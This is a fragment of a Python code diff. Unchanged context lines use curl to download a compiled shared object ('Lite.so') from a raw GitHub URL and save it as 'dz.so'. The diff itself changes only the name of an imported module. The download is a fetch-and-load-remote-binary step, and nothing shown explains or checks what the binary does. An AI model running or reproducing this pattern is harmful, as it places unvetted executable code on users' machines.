@@ -20,4 +20,4 @@ while True:
             break
         else:
             system(f"curl -L https://raw.githubusercontent.com/Junaid-2/Data/main/Lite.so -o dz.so")
-import asad
+import AKING
